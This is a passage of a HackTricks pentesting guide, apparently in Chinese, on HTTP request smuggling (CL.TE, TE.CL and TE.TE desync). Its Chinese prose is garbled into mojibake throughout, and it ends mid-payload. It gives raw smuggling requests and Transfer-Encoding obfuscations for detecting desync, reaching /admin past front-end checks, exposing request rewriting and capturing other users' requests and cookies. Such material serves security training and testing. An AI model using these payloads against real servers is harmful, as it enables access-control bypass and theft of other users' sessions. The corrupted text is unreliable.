# HTTPè¯·æ±‚èµ°ç§ / HTTPè§£åŒæ­¥æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»€ä¹ˆæ˜¯

å½“**å‰ç«¯ä»£ç†**å’Œ**åç«¯**æœåŠ¡å™¨ä¹‹é—´çš„**ä¸åŒæ­¥**å…è®¸**æ”»å‡»è€…**å‘é€ä¸€ä¸ªHTTP**è¯·æ±‚**ï¼Œè¯¥è¯·æ±‚è¢«**å‰ç«¯**ä»£ç†ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰è§£é‡Šä¸º**å•ä¸ªè¯·æ±‚**ï¼Œè€Œè¢«**åç«¯**æœåŠ¡å™¨è§£é‡Šä¸º**ä¸¤ä¸ªè¯·æ±‚**æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æ¼æ´ã€‚\
è¿™å…è®¸ç”¨æˆ·**ä¿®æ”¹ä¸‹ä¸€ä¸ªåˆ°è¾¾åç«¯æœåŠ¡å™¨çš„è¯·æ±‚**ã€‚

### ç†è®º

[**RFCè§„èŒƒ (2161)**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœä¸€æ¡æ¶ˆæ¯åŒæ—¶æ”¶åˆ°äº†Transfer-Encodingå¤´å­—æ®µå’ŒContent-Lengthå¤´å­—æ®µï¼Œåè€…å¿…é¡»è¢«å¿½ç•¥ã€‚

**Content-Length**

> Content-Lengthå®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶è€…çš„å®ä½“-ä½“çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encodingå¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè½½è·ä½“åˆ°ç”¨æˆ·çš„ç¼–ç å½¢å¼ã€‚\
> Chunkedæ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€

### ç°å®

**å‰ç«¯**ï¼ˆä¸€ä¸ªè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰å¤„ç†**content-length**æˆ–**transfer-encoding**å¤´ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨å¤„ç†å¦ä¸€ä¸ªå¤´ï¼Œå¯¼è‡´ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„**ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å…³é”®ï¼Œå› ä¸º**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘é€ä¸€ä¸ªè¯·æ±‚**åˆ°åå‘ä»£ç†ï¼Œè¯¥è¯·æ±‚å°†è¢«**åç«¯**æœåŠ¡å™¨è§£é‡Šä¸º**ä¸¤ä¸ªä¸åŒçš„è¯·æ±‚**ã€‚è¿™ç§æŠ€æœ¯çš„**å±é™©**åœ¨äºåç«¯æœåŠ¡å™¨å°†è§£é‡Š**æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**ï¼Œå¥½åƒå®ƒæ˜¯**æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„**çœŸå®è¯·æ±‚**å°†æˆä¸º**æ³¨å…¥è¯·æ±‚**çš„ä¸€éƒ¨åˆ†ã€‚

### ç‰¹ç‚¹

è®°ä½ï¼Œåœ¨HTTPä¸­**ä¸€ä¸ªæ–°è¡Œå­—ç¬¦ç”±2ä¸ªå­—èŠ‚ç»„æˆ**ï¼š

* **Content-Length**ï¼šæ­¤å¤´ä½¿ç”¨ä¸€ä¸ª**åè¿›åˆ¶æ•°**æ¥æŒ‡ç¤ºè¯·æ±‚**ä½“**çš„**å­—èŠ‚æ•°**ã€‚è¯·æ±‚ä½“é¢„æœŸåœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**è¯·æ±‚ç»“æŸæ—¶ä¸éœ€è¦æ–°è¡Œ**ã€‚
* **Transfer-Encoding**ï¼šæ­¤å¤´åœ¨**ä½“**ä¸­ä½¿ç”¨ä¸€ä¸ª**åå…­è¿›åˆ¶æ•°**æ¥æŒ‡ç¤º**ä¸‹ä¸€ä¸ªå—**çš„**å­—èŠ‚æ•°**ã€‚**å—**å¿…é¡»ä»¥**æ–°è¡Œç»“æŸ**ï¼Œä½†è¿™ä¸ªæ–°è¡Œ**ä¸è¢«é•¿åº¦æŒ‡ç¤ºå™¨è®¡ç®—**ã€‚è¿™ç§ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥**å¤§å°ä¸º0çš„å—ç»“æŸï¼Œåè·Ÿ2ä¸ªæ–°è¡Œ**ï¼š`0`
* **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚èµ°ç§çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨**`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

å› æ­¤ï¼Œè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†`Content-Length`å¤´å’Œ`Transfer-Encoding`å¤´æ”¾å…¥å•ä¸ªHTTPè¯·æ±‚ä¸­ï¼Œå¹¶æ“çºµè¿™äº›å¤´ï¼Œä½¿å‰ç«¯å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å…·ä½“åšæ³•å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š

* **CL.TE**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ã€‚
* **TE.CL**ï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ã€‚
* **TE.TE**ï¼šå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´ï¼Œä½†å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚

### CL.TEæ¼æ´

åœ¨è¿™é‡Œï¼Œ**å‰ç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Content-Length`**å¤´ï¼Œè€Œ**åç«¯**æœåŠ¡å™¨ä½¿ç”¨**`Transfer-Encoding`**å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªç®€å•çš„HTTPè¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

æ³¨æ„`Content-Length`æŒ‡ç¤º**è¯·æ±‚ä½“é•¿åº¦ä¸º30å­—èŠ‚**ï¼ˆ_è®°ä½HTTPä½¿ç”¨æ–°è¡Œï¼Œæ‰€ä»¥æ¯ä¸ªæ–°è¡Œ2å­—èŠ‚_ï¼‰ï¼Œå› æ­¤åå‘ä»£ç†**å°†å‘é€å®Œæ•´çš„è¯·æ±‚**åˆ°åç«¯ï¼Œåç«¯å°†å¤„ç†`Transfer-Encoding`å¤´ï¼Œç•™ä¸‹`GET /404 HTTP/1.1`ä½œä¸º**ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹**ï¼ˆé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†é™„åŠ åˆ°`Foo:x<Next request starts here>`ï¼‰ã€‚

### TE.CLæ¼æ´

åœ¨è¿™é‡Œï¼Œå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨`Transfer-Encoding`å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨`Content-Length`å¤´ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªç®€å•çš„HTTPè¯·æ±‚èµ°ç§æ”»å‡»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**åå‘ä»£ç†**å°†**å‘é€æ•´ä¸ªè¯·æ±‚**åˆ°**åç«¯**ï¼Œå› ä¸º**`Transfer-encoding`**å¤´æŒ‡ç¤ºäº†è¿™æ ·åšã€‚ä½†æ˜¯ï¼Œ**åç«¯**å°†åª**å¤„ç†**`7b`**ï¼ˆ4å­—èŠ‚ï¼‰**ï¼Œå¦‚`Content-Length`ä¸­æ‰€ç¤ºã€‚å› æ­¤ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†ä»`GET /404 HTTP/1.1`å¼€å§‹

_æ³¨æ„ï¼Œå³ä½¿æ”»å‡»å¿…é¡»ä»¥`0`ç»“æŸï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚ä¹Ÿå°†ä½œä¸º**x**å‚æ•°çš„é¢å¤–å€¼é™„åŠ ã€‚_\
_è¿˜è¦æ³¨æ„ï¼ŒåµŒå…¥è¯·æ±‚çš„Content-Lengthå°†æŒ‡ç¤ºä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ï¼Œè¯¥è¯·æ±‚å°†é™„åŠ åˆ°**x**å‚æ•°ã€‚å¦‚æœå®ƒå¤ªå°ï¼Œåªæœ‰å‡ ä¸ªå­—èŠ‚å°†è¢«é™„åŠ ï¼Œå¦‚æœå¤ªå¤§ï¼ˆå¤§äºä¸‹ä¸€ä¸ªè¯·æ±‚çš„é•¿åº¦ï¼‰ï¼Œå°†ä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚æŠ›å‡ºé”™è¯¯ã€‚_

### TE.TEæ¼æ´

åœ¨è¿™é‡Œï¼Œå‰ç«¯å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒ`Transfer-Encoding`å¤´ï¼Œä½†å¯ä»¥é€šè¿‡æŸç§æ–¹å¼æ··æ·†å¤´æ¥è¯±å¯¼å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨ä¸å¤„ç†å®ƒã€‚\
æ··æ·†`Transfer-Encoding`å¤´çš„æ–¹æ³•å¯èƒ½æ˜¯æ— ç©·æ— å°½çš„ã€‚ä¾‹å¦‚ï¼š

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

æ ¹æ®**åœæ­¢å¤„ç†** **TE**å¤´çš„æœåŠ¡å™¨ï¼ˆåå‘ä»£ç†æˆ–åç«¯ï¼‰ï¼Œæ‚¨å°†å‘ç°**CL.TEæ¼æ´**æˆ–**TE.CLæ¼æ´**ã€‚

## å‘ç°HTTPè¯·æ±‚èµ°ç§

### ä½¿ç”¨æ—¶åºæŠ€æœ¯å‘ç°CL.TEæ¼æ´

å¦‚æœåº”ç”¨ç¨‹åºå¯¹CL.TEå˜ä½“çš„è¯·æ±‚èµ°ç§æ¼æ´æ•æ„Ÿï¼Œé‚£ä¹ˆå‘é€å¦‚ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ `Content-Length` å¤´ï¼Œå®ƒå°†åªè½¬å‘è¿™ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥äº† `0`ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨ `Transfer-Encoding` å¤´ï¼Œå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œç„¶åç­‰å¾…ä¸‹ä¸€ä¸ªå—åˆ°è¾¾ã€‚è¿™å°†å¯¼è‡´ä¸€ä¸ªå¯è§‚å¯Ÿçš„æ—¶é—´å»¶è¿Ÿã€‚

æœ‰æ—¶ï¼Œä½ ä¸ä¼šå¾—åˆ°è¶…æ—¶ï¼Œè€Œæ˜¯ä»æœ€ç»ˆä¸»æœºæ”¶åˆ°ä¸€ä¸ª400é”™è¯¯è¯·æ±‚ï¼Œå°±åƒåœ¨ä»¥ä¸‹æƒ…å†µä¸­ï¼Œå‘é€äº†ä¸€ä¸ªCL.TEè´Ÿè½½ï¼š

![](<../../.gitbook/assets/image (444).png>)

å“åº”æ˜¯ä¸€ä¸ªåŒ…å«é”™è¯¯çš„é‡å®šå‘ï¼Œåœ¨æ­£æ–‡ä¸­ç”šè‡³åŒ…å«äº†haproxyçš„ç‰ˆæœ¬ï¼š

![](<../../.gitbook/assets/image (443).png>)

### ä½¿ç”¨æ—¶åºæŠ€æœ¯å‘ç°TE.CLæ¼æ´

å¦‚æœåº”ç”¨ç¨‹åºå¯¹TE.CLå˜ä½“çš„è¯·æ±‚èµ°ç§æ¼æ´æ•æ„Ÿï¼Œé‚£ä¹ˆå‘é€å¦‚ä¸‹è¯·æ±‚é€šå¸¸ä¼šå¯¼è‡´æ—¶é—´å»¶è¿Ÿï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
```markdown
ç”±äºå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ `Transfer-Encoding` å¤´ï¼Œå®ƒå°†åªè½¬å‘è¿™ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œçœç•¥äº† `X`ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨ `Content-Length` å¤´ï¼ŒæœŸæœ›æ¶ˆæ¯ä½“ä¸­æœ‰æ›´å¤šå†…å®¹ï¼Œå¹¶ç­‰å¾…å‰©ä½™å†…å®¹çš„åˆ°æ¥ã€‚è¿™å°†å¯¼è‡´ä¸€ä¸ªå¯è§‚å¯Ÿçš„æ—¶é—´å»¶è¿Ÿã€‚

### æ¢æµ‹HTTPè¯·æ±‚èµ°ç§æ¼æ´

ä¸€æ—¦ä½ å‘ç°**å®šæ—¶æŠ€æœ¯æœ‰æ•ˆ**ï¼Œä½ éœ€è¦**æ¢æµ‹**ä½ æ˜¯å¦å¯ä»¥**æ”¹å˜å…¶ä»–å®¢æˆ·ç«¯çš„è¯·æ±‚**ã€‚\
æœ€ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ±¡æŸ“ä½ è‡ªå·±çš„è¯·æ±‚ï¼Œä¾‹å¦‚**å‘å‡ºå¯¹`/`çš„è¯·æ±‚è¿”å›404**ã€‚\
åœ¨[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†`CL.TE`å’Œ`TE.CL`çš„ä¾‹å­ï¼Œå¦‚ä½•é€šè¿‡è¯·æ±‚`/404`æ¥æ±¡æŸ“å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚å…¶ä»–èµ„æºæ—¶å¼•å‘404å“åº”ã€‚

**æ³¨æ„**

åœ¨å°è¯•é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æ¥ç¡®è®¤è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œåº”è¯¥ç‰¢è®°ä¸€äº›é‡è¦çš„è€ƒè™‘å› ç´ ï¼š

* "æ”»å‡»"è¯·æ±‚å’Œ"æ­£å¸¸"è¯·æ±‚åº”è¯¥ä½¿ç”¨ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€åˆ°æœåŠ¡å™¨ã€‚é€šè¿‡åŒä¸€è¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚å°†æ— æ³•è¯æ˜æ¼æ´çš„å­˜åœ¨ã€‚
* "æ”»å‡»"è¯·æ±‚å’Œ"æ­£å¸¸"è¯·æ±‚åº”è¯¥å°½å¯èƒ½ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°åã€‚è¿™æ˜¯å› ä¸ºè®¸å¤šç°ä»£åº”ç”¨ç¨‹åºä¼šæ ¹æ®URLå’Œå‚æ•°å°†å‰ç«¯è¯·æ±‚è·¯ç”±åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°å¢åŠ äº†è¯·æ±‚å°†ç”±åŒä¸€åç«¯æœåŠ¡å™¨å¤„ç†çš„æœºä¼šï¼Œè¿™å¯¹æ”»å‡»çš„æˆåŠŸè‡³å…³é‡è¦ã€‚
* åœ¨æµ‹è¯•"æ­£å¸¸"è¯·æ±‚ä»¥æ£€æµ‹æ˜¯å¦å—åˆ°"æ”»å‡»"è¯·æ±‚çš„å¹²æ‰°æ—¶ï¼Œä½ æ­£åœ¨ä¸åº”ç”¨ç¨‹åºåŒæ—¶æ¥æ”¶çš„ä»»ä½•å…¶ä»–è¯·æ±‚ï¼ˆåŒ…æ‹¬æ¥è‡ªå…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ï¼‰ç«äº‰ã€‚ä½ åº”è¯¥åœ¨"æ”»å‡»"è¯·æ±‚ä¹‹åç«‹å³å‘é€"æ­£å¸¸"è¯·æ±‚ã€‚å¦‚æœåº”ç”¨ç¨‹åºå¾ˆå¿™ï¼Œä½ å¯èƒ½éœ€è¦è¿›è¡Œå¤šæ¬¡å°è¯•æ¥ç¡®è®¤æ¼æ´ã€‚
* åœ¨ä¸€äº›åº”ç”¨ç¨‹åºä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å……å½“è´Ÿè½½å‡è¡¡å™¨ï¼Œå¹¶æ ¹æ®æŸç§è´Ÿè½½å‡è¡¡ç®—æ³•å°†è¯·æ±‚è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœä½ çš„"æ”»å‡»"å’Œ"æ­£å¸¸"è¯·æ±‚è¢«è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿï¼Œé‚£ä¹ˆæ”»å‡»å°†å¤±è´¥ã€‚è¿™æ˜¯ä½ å¯èƒ½éœ€è¦å°è¯•å¤šæ¬¡æ‰èƒ½ç¡®è®¤æ¼æ´çš„å¦ä¸€ä¸ªåŸå› ã€‚
* å¦‚æœä½ çš„æ”»å‡»æˆåŠŸå¹²æ‰°äº†åç»­è¯·æ±‚ï¼Œä½†è¿™ä¸æ˜¯ä½ å‘é€çš„ç”¨äºæ£€æµ‹å¹²æ‰°çš„"æ­£å¸¸"è¯·æ±‚ï¼Œè¿™æ„å‘³ç€å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”¨æˆ·å—åˆ°äº†ä½ æ”»å‡»çš„å½±å“ã€‚å¦‚æœä½ ç»§ç»­è¿›è¡Œæµ‹è¯•ï¼Œè¿™å¯èƒ½ä¼šå¯¹å…¶ä»–ç”¨æˆ·é€ æˆç ´åæ€§å½±å“ï¼Œä½ åº”è¯¥è°¨æ…è¡Œäº‹ã€‚

### é€šè¿‡é€è·³å¤´éƒ¨å¼ºåˆ¶æ‰§è¡Œ

æ»¥ç”¨é€è·³å¤´éƒ¨ï¼Œä½ å¯ä»¥æŒ‡ç¤ºä»£ç†**åˆ é™¤å¤´éƒ¨Content-Lengthæˆ–Transfer-Encodingï¼Œä»è€Œå¯èƒ½æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§**ã€‚
```
```
Connection: Content-Length
```
æœ‰å…³**è·³è·ƒå¼å¤´éƒ¨ï¼ˆhop-by-hop headersï¼‰**çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§

### ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶

æœ‰æ—¶**å‰ç«¯ä»£ç†ä¼šæ‰§è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥**ã€‚æ‚¨å¯ä»¥é€šè¿‡æ»¥ç”¨HTTPè¯·æ±‚èµ°ç§æ¥é¿å…è¿™äº›æ£€æŸ¥ï¼Œå› ä¸ºæ‚¨å°†èƒ½å¤Ÿ**ç»•è¿‡ä¿æŠ¤æªæ–½**ã€‚ä¾‹å¦‚ï¼Œåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨**æ— æ³•ä»å¤–éƒ¨è®¿é—®`/admin`**ï¼Œå‰ç«¯ä»£ç†æ­£åœ¨æ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œä½†è¿™ä¸ª**ä»£ç†æ²¡æœ‰æ£€æŸ¥åµŒå…¥çš„è¯·æ±‚**ï¼š

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

åœ¨è®¸å¤šåº”ç”¨ç¨‹åºä¸­ï¼Œ**å‰ç«¯æœåŠ¡å™¨åœ¨å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ä¹‹å‰ä¼šå¯¹è¯·æ±‚è¿›è¡Œä¸€äº›é‡å†™**ï¼Œé€šå¸¸æ˜¯é€šè¿‡æ·»åŠ ä¸€äº›é¢å¤–çš„è¯·æ±‚å¤´éƒ¨ã€‚\
ä¸€ä¸ªå¸¸è§çš„åšæ³•æ˜¯å‘è¯·æ±‚ä¸­**æ·»åŠ å¤´éƒ¨**`X-Forwarded-For: <å®¢æˆ·ç«¯çš„IP>`æˆ–ç±»ä¼¼çš„å¤´éƒ¨ï¼Œä»¥ä¾¿åç«¯çŸ¥é“å®¢æˆ·ç«¯çš„IPã€‚\
æœ‰æ—¶ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿ**æ‰¾åˆ°å“ªäº›æ–°å€¼è¢«é™„åŠ **åˆ°è¯·æ±‚ä¸­ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿ**ç»•è¿‡ä¿æŠ¤æªæ–½**å¹¶**è®¿é—®éšè—çš„ä¿¡æ¯**/**ç«¯ç‚¹**ã€‚

ä¸ºäº†å‘ç°ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ï¼Œæ‚¨éœ€è¦**æ‰¾åˆ°ä¸€ä¸ªPOSTå‚æ•°ï¼Œåç«¯ä¼šåœ¨å“åº”ä¸­åæ˜ å…¶å€¼**ã€‚ç„¶åï¼Œå°†æ­¤å‚æ•°ä½œä¸ºæœ€åä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„æ¼æ´åˆ©ç”¨ï¼š

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚å°†è¢«é™„åŠ åœ¨`search=`ä¹‹åï¼Œè¿™ä¹Ÿæ˜¯**å°†è¦åœ¨å“åº”ä¸­åæ˜ å…¶å€¼çš„å‚æ•°**ï¼Œå› æ­¤å®ƒå°†**åæ˜ ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¤´éƒ¨**ã€‚

è¯·æ³¨æ„ï¼Œ**åªæœ‰åµŒå…¥è¯·æ±‚çš„`Content-Length`å¤´éƒ¨ä¸­æŒ‡ç¤ºçš„é•¿åº¦å°†è¢«åæ˜ **ã€‚å¦‚æœæ‚¨ä½¿ç”¨è¾ƒä½çš„æ•°å­—ï¼Œåªä¼šåæ˜ å‡ ä¸ªå­—èŠ‚ï¼›å¦‚æœæ‚¨ä½¿ç”¨çš„æ•°å­—å¤§äºæ‰€æœ‰å¤´éƒ¨çš„é•¿åº¦ï¼Œåˆ™åµŒå…¥çš„è¯·æ±‚å°†æŠ›å‡ºé”™è¯¯ã€‚ç„¶åï¼Œæ‚¨åº”è¯¥**ä»ä¸€ä¸ªå°æ•°å­—å¼€å§‹**å¹¶**é€æ¸å¢åŠ **ï¼Œç›´åˆ°æ‚¨çœ‹åˆ°æ‰€æœ‰æ‚¨æƒ³çœ‹åˆ°çš„å†…å®¹ã€‚\
è¿˜è¯·æ³¨æ„ï¼Œè¿™ç§**æŠ€æœ¯ä¹Ÿå¯ä»¥åˆ©ç”¨TE.CL**æ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“æŸã€‚ç„¶è€Œï¼Œæ— è®ºæ–°è¡Œå­—ç¬¦å¦‚ä½•ï¼Œå€¼éƒ½å°†è¢«é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚

æœ€åè¯·æ³¨æ„ï¼Œåœ¨è¿™æ¬¡æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬ä»ç„¶æ˜¯åœ¨æ”»å‡»è‡ªå·±ä»¥äº†è§£å‰ç«¯ä»£ç†å¦‚ä½•é‡å†™è¯·æ±‚ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

å¦‚æœæ‚¨èƒ½æ‰¾åˆ°ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†ä¿å­˜å…¶ä¸­ä¸€ä¸ªå‚æ•°çš„å†…å®¹ï¼Œæ‚¨å¯ä»¥å°†ä»¥ä¸‹è¯·æ±‚ä½œä¸ºè¯¥å‚æ•°çš„å€¼é™„åŠ ä¸Šå»ï¼Œä»¥ä¾¿å­˜å‚¨ä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
